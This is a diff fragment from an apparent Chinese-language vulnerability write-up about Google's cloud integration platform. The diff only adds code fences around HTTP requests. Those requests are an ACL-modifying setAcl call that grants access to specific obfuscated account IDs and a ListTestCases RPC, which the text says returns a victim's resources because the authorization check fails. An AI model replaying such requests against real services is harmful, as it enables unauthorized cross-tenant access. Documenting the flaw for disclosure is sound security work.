@@ -1074,6 +1074,8 @@ shrugged 想出了绕法——把 IP_EVENTBUS_WORKFLOWS 的 ACL 更新成两个�
 ●  
 请求 · setAcl  
   
+
+```http
 POST /v1/integrationPlatform/auth:setAcl HTTP/2  
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
@@ -1092,6 +1094,8 @@ Content-Length: 500
 　　{"scope": {"obfuscatedGaiaId": "100029910836469267942"}, "role": 105},  
   
 　　{"scope": {"obfuscatedGaiaId": "113728935872649341310"}, "role": 105}]}}  
+```
+
   
 ●  
 ●  
@@ -1274,6 +1278,8 @@ API 会开开心心地把受害者的资源返回给你——因为认证检查�
 ●  
 请求 · ListTestCases  
   
+
+```http
 POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases HTTP/2  
   
 Host: us-central1-integrations.clients6.google.com  
@@ -1282,6 +1288,8 @@ Content-Type: application/x-protobuf
   
   
 < RAW PROTOBUF DATA >  
+```
+
   
 真正的请求体是 protobuf，我把它解码出来是这样的：  
   
